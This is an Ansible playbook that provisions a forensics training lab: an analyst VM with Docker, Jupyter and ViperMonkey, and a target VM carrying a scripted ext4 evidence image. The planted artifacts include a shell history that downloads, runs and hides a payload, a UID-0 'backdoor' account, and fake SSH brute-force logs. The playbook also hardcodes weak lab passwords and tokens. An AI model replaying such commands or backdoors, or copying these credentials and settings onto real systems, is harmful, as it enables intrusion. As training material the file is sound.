# ─────────────────────────────────────────────
#  MACHINE 1 - uavm
# ─────────────────────────────────────────────
- name: init machine uavm
  hosts:
    - uavm
  become: true

  tasks:

  # ─── Disable unattended-upgrades ────────────────────────────

    - name: Disable unattended-upgrades during provisioning
      ansible.builtin.systemd:
        name: unattended-upgrades
        state: stopped
      failed_when: false

    - name: Kill leftover apt/dpkg processes
      ansible.builtin.shell: |
        pkill -9 apt || true
        pkill -9 dpkg || true
      changed_when: false
      failed_when: false

    - name: Wait for apt lock to be released
      ansible.builtin.shell: >
        while fuser /var/lib/dpkg/lock-frontend /var/lib/apt/lists/lock \
        /var/cache/apt/archives/lock /var/lib/dpkg/lock >/dev/null 2>&1; do
          sleep 3
        done
      changed_when: false
      failed_when: false

  # ─── Base APT packages ──────────────────────────────────────

    - name: Install base packages
      ansible.builtin.apt:
        name:
          - python3
          - python3-pip
          - python3-venv
          - python3-dev
          - pipx
          - git
          - wget
          - curl
          - unzip
          - zip
          - firefox
          # Forensics tools
          - dc3dd
          # Docker dependencies
          - ca-certificates
          - gnupg
          - lsb-release
          - apt-transport-https
          # ViperMonkey dependencies
          - libxml2-dev
          - libxslt1-dev
          - zlib1g-dev
        state: present
        update_cache: 'yes'

  # ─── Docker ─────────────────────────────────────────────────

    - name: Create Docker apt keyring directory
      ansible.builtin.file:
        path: /etc/apt/keyrings
        state: directory
        mode: '0755'

    - name: Download Docker GPG key
      ansible.builtin.shell: |
        curl -fsSL https://download.docker.com/linux/ubuntu/gpg \
          | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
        chmod a+r /etc/apt/keyrings/docker.gpg
      args:
        creates: /etc/apt/keyrings/docker.gpg

    - name: Add Docker apt repository
      ansible.builtin.shell: |
        echo "deb [arch=$(dpkg --print-architecture) \
          signed-by=/etc/apt/keyrings/docker.gpg] \
          https://download.docker.com/linux/ubuntu \
          $(. /etc/os-release && echo "$VERSION_CODENAME") stable" \
          > /etc/apt/sources.list.d/docker.list
      args:
        creates: /etc/apt/sources.list.d/docker.list

    - name: Install Docker Engine
      ansible.builtin.apt:
        name:
          - docker-ce
          - docker-ce-cli
          - containerd.io
          - docker-buildx-plugin
          - docker-compose-plugin
        state: present
        update_cache: 'yes'

    - name: Enable and start Docker service
      ansible.builtin.systemd:
        name: docker
        state: started
        enabled: true

    - name: Add user to docker group
      ansible.builtin.user:
        name: user
        groups: docker
        append: true

  # ─── Jupyter Notebook ───────────────────────────────────────
  # Deployed via Docker for easy access on port 8888

    - name: Pull Jupyter minimal-notebook Docker image
      ansible.builtin.shell: |
        docker pull quay.io/jupyter/minimal-notebook
      changed_when: false
      failed_when: false

    - name: Create Jupyter notebooks directory
      ansible.builtin.file:
        path: /opt/jupyter/notebooks
        state: directory
        mode: '0777'

    - name: Create Jupyter Docker Compose file
      ansible.builtin.copy:
        dest: /opt/jupyter/docker-compose.yml
        content: |
          version: "3"
          services:
            jupyter:
              image: quay.io/jupyter/minimal-notebook
              container_name: jupyter
              restart: unless-stopped
              ports:
                - "8888:8888"
              volumes:
                - /opt/jupyter/notebooks:/home/jovyan/work
              environment:
                - JUPYTER_ENABLE_LAB=yes
                - JUPYTER_TOKEN=forensics
        mode: '0644'

    - name: Start Jupyter via Docker Compose
      ansible.builtin.shell: |
        docker compose up -d
      args:
        chdir: /opt/jupyter
      changed_when: true

  # ─── ViperMonkey ────────────────────────────────────────────
  # Installed via pipx from GitHub for system-wide vmonkey CLI

    - name: Install ViperMonkey via pipx from GitHub
      ansible.builtin.shell: |
        pipx install git+https://github.com/decalage2/ViperMonkey.git
        pipx ensurepath
      environment:
        PIPX_HOME: /opt/pipx
        PIPX_BIN_DIR: /usr/local/bin
      args:
        creates: /usr/local/bin/vmonkey
      failed_when: false

  # ─── Shell PATH for pipx ────────────────────────────────────

    - name: Ensure pipx bin dir is in system-wide PATH
      ansible.builtin.copy:
        dest: /etc/profile.d/pipx_path.sh
        content: |
          export PATH="/usr/local/bin:$PATH"
        mode: '0644'

  # ─── Role ─────────────────────────────────────────────────────
  roles:
    - role: user-access
      user_access_username: user
      user_access_password: 'Password123'
      user_access_sudo: true


# ─────────────────────────────────────────────
#  MACHINE 2 - targetvm
# ─────────────────────────────────────────────
- name: init machine targetvm
  hosts:
    - targetvm
  become: true

  handlers:
    - name: Restart SSH
      ansible.builtin.systemd:
        name: ssh
        state: restarted

  tasks:

  # ─── SSH ────────────────────────────────────────────────────

    - name: Install openssh-server
      ansible.builtin.apt:
        name: openssh-server
        state: present
        update_cache: true

    - name: Enable and start SSH service
      ansible.builtin.systemd:
        name: ssh
        state: started
        enabled: true

    - name: Allow password authentication in sshd_config
      ansible.builtin.lineinfile:
        path: /etc/ssh/sshd_config
        regexp: '^#?PasswordAuthentication'
        line: 'PasswordAuthentication yes'
        state: present
      notify: Restart SSH

    - name: Disable root SSH login
      ansible.builtin.lineinfile:
        path: /etc/ssh/sshd_config
        regexp: '^#?PermitRootLogin'
        line: 'PermitRootLogin no'
        state: present
      notify: Restart SSH

  # ─── Evidence disk image — deterministic Linux artifact content ─
  # No Cinder volume needed. We create a 1 GB raw image file,
  # format it ext4, loop-mount it, write all artifacts, then
  # detach. Students image it with:
  #   dc3dd if=/opt/evidence.img of=<dest> hash=sha256
  # All file content is hardcoded — no dynamic timestamps —
  # so the hash is identical on every sandbox allocation.
  #
  # Layout (ext4 image at /opt/evidence.img, label: evidence):
  #   home/user/.bash_history  .bashrc  .bash_logout
  #   var/log/syslog.1  auth.log.1  cron.log
  #   etc/crontab  passwd.bak
  #   tmp/script.sh

    - name: Install e2fsprogs and util-linux
      ansible.builtin.apt:
        name:
          - e2fsprogs
          - util-linux
        state: present

    - name: Create mount point /mnt/evidence
      ansible.builtin.file:
        path: /mnt/evidence
        state: directory
        mode: '0755'

    - name: Check if evidence image already written (idempotency)
      ansible.builtin.stat:
        path: /opt/evidence.img
      register: evidence_img

    - name: Create 1 GB raw evidence image file
      ansible.builtin.shell: |
        dd if=/dev/zero of=/opt/evidence.img bs=1M count=1024
      when: not evidence_img.stat.exists
      changed_when: true

    - name: Format evidence image as ext4
      ansible.builtin.shell: |
        mkfs.ext4 -F -L evidence /opt/evidence.img
      when: not evidence_img.stat.exists
      changed_when: true

    - name: Mount evidence image via loop device
      ansible.builtin.shell: |
        mount -o loop /opt/evidence.img /mnt/evidence
      when: not evidence_img.stat.exists
      changed_when: true

    - name: Create artifact directory structure
      ansible.builtin.file:
        path: "/mnt/evidence/{{ item }}"
        state: directory
        mode: '0755'
      loop:
        - home/user
        - var/log
        - etc
        - tmp
      when: not evidence_img.stat.exists

    - name: Write home/user/.bash_history
      ansible.builtin.copy:
        dest: /mnt/evidence/home/user/.bash_history
        mode: '0600'
        content: |
          ls -la
          cd /var/log
          cat syslog
          sudo su
          cat /etc/passwd
          wget http://192.168.0.10/payload.sh
          chmod +x payload.sh
          ./payload.sh
          rm -f payload.sh
          history -c
      when: not evidence_img.stat.exists

    - name: Write home/user/.bashrc
      ansible.builtin.copy:
        dest: /mnt/evidence/home/user/.bashrc
        mode: '0644'
        content: |
          # ~/.bashrc
          export HISTSIZE=1000
          export HISTFILESIZE=2000
          export PS1='\u@\h:\w\$ '
          alias ll='ls -alF'
          alias la='ls -A'
      when: not evidence_img.stat.exists

    - name: Write home/user/.bash_logout
      ansible.builtin.copy:
        dest: /mnt/evidence/home/user/.bash_logout
        mode: '0644'
        content: |
          # ~/.bash_logout
          clear
      when: not evidence_img.stat.exists

    - name: Write var/log/syslog.1
      ansible.builtin.copy:
        dest: /mnt/evidence/var/log/syslog.1
        mode: '0640'
        content: |
          May 10 03:17:01 targetvm CRON[1234]: (root) CMD (/usr/bin/python3 /opt/updater.py)
          May 10 03:17:02 targetvm kernel: [12345.678] EXT4-fs (sda1): mounted filesystem
          May 10 03:21:44 targetvm sshd[2001]: Accepted password for user from 192.168.0.10 port 54320 ssh2
          May 10 03:22:10 targetvm sudo[2045]: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash
          May 10 03:22:11 targetvm su[2046]: Successful su for root by user
          May 10 03:25:55 targetvm sshd[2001]: Disconnected from user user 192.168.0.10 port 54320
          May 10 04:01:01 targetvm CRON[2100]: (root) CMD (/usr/bin/python3 /opt/updater.py)
          May 10 04:17:01 targetvm CRON[2200]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
      when: not evidence_img.stat.exists

    - name: Write var/log/auth.log.1
      ansible.builtin.copy:
        dest: /mnt/evidence/var/log/auth.log.1
        mode: '0640'
        content: |
          May 10 03:21:40 targetvm sshd[2001]: Connection from 192.168.0.10 port 54320
          May 10 03:21:44 targetvm sshd[2001]: Accepted password for user from 192.168.0.10 port 54320 ssh2
          May 10 03:21:44 targetvm sshd[2001]: pam_unix(sshd:session): session opened for user user
          May 10 03:22:10 targetvm sudo[2045]: pam_unix(sudo:auth): authentication failure; logname=user uid=1000
          May 10 03:22:10 targetvm sudo[2045]: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash
          May 10 03:25:55 targetvm sshd[2001]: pam_unix(sshd:session): session closed for user user
          May 10 05:13:22 targetvm sshd[3001]: Failed password for invalid user admin from 10.10.10.5 port 22345 ssh2
          May 10 05:13:25 targetvm sshd[3001]: Failed password for invalid user admin from 10.10.10.5 port 22346 ssh2
          May 10 05:13:28 targetvm sshd[3001]: Failed password for invalid user root from 10.10.10.5 port 22347 ssh2
      when: not evidence_img.stat.exists

    - name: Write var/log/cron.log
      ansible.builtin.copy:
        dest: /mnt/evidence/var/log/cron.log
        mode: '0640'
        content: |
          May 10 03:17:01 targetvm CRON[1234]: (root) CMD (/usr/bin/python3 /opt/updater.py)
          May 10 04:01:01 targetvm CRON[2100]: (root) CMD (/usr/bin/python3 /opt/updater.py)
          May 10 04:17:01 targetvm CRON[2200]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
          May 10 05:01:01 targetvm CRON[2300]: (root) CMD (/usr/bin/python3 /opt/updater.py)
      when: not evidence_img.stat.exists

    - name: Write etc/crontab
      ansible.builtin.copy:
        dest: /mnt/evidence/etc/crontab
        mode: '0644'
        content: |
          # /etc/crontab
          SHELL=/bin/sh
          PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
          17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
          1  *    * * *   root    /usr/bin/python3 /opt/updater.py
          0  2    * * *   root    /usr/bin/find /tmp -mtime +1 -delete
      when: not evidence_img.stat.exists

    - name: Write etc/passwd.bak
      ansible.builtin.copy:
        dest: /mnt/evidence/etc/passwd.bak
        mode: '0644'
        content: |
          root:x:0:0:root:/root:/bin/bash
          daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
          www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
          user:x:1000:1000:user,,,:/home/user:/bin/bash
          backdoor:x:0:0::/root:/bin/bash
      when: not evidence_img.stat.exists

    - name: Write tmp/script.sh
      ansible.builtin.copy:
        dest: /mnt/evidence/tmp/script.sh
        mode: '0755'
        content: |
          #!/bin/bash
          exec /usr/bin/python3 /opt/updater.py "$@"
      when: not evidence_img.stat.exists

    - name: Stamp .disk_written flag (read-only)
      ansible.builtin.file:
        path: /mnt/evidence/.disk_written
        state: touch
        mode: '0444'
      when: not evidence_img.stat.exists

    - name: Sync and unmount evidence disk
      ansible.builtin.shell: |
        sync
        umount /mnt/evidence
      when: not evidence_img.stat.exists
      changed_when: true

    - name: Print Image Ready
      ansible.builtin.debug:
        msg: "targetvm ready. Evidence image /opt/evidence.img written and detached."

  # ─── Role ─────────────────────────────────────────────────────
  roles:
    - role: user-access
      user_access_username: user
      user_access_password: 'btcmp16@admin'
      user_access_sudo: true
